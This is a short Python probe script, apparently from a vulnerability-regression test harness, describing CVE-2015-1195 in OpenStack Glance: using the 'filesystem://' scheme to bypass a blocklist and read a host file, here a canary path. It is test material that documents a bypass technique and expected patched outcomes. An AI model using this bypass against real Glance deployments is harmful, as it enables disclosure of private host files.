#!/usr/bin/env python3
"""[RESIDUAL] CVE-2015-1195 residual exploit -- the SAME arbitrary-host-file
disclosure via image location, but using the `filesystem://` scheme instead of
`file://`.

The CVE-2014-9493 fix (commit 4afdb017) added validate_external_location(),
whose blocklist excludes only `file` and `swift+config`. But the glance_store
filesystem backend registers TWO schemes for the very same local-file store:
`file` AND `filesystem`. `filesystem` was never added to the blocklist, so
`filesystem:///canary/secret.txt` sails through the guard and the filesystem
store reads the host file anyway -- identical disclosure, different scheme name.

Contract:
  * V1 (CVE-2014-9493 patched)  : REACHES the canary (flag) -> legitimate residual.
  * V2 (CVE-2015-1195 patched)  : BLOCKED (commit a2d986b9 adds 'filesystem' to
                                  RESTRICTED_URI_SCHEMAS).
"""
from __future__ import annotations

CANARY_PATH = "/canary/secret.txt"


def candidate() -> dict:
    return {
        "probe_id": "cve-2015-1195-filesystem-scheme",
        "scheme": "filesystem",
        "path": CANARY_PATH,
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate()))
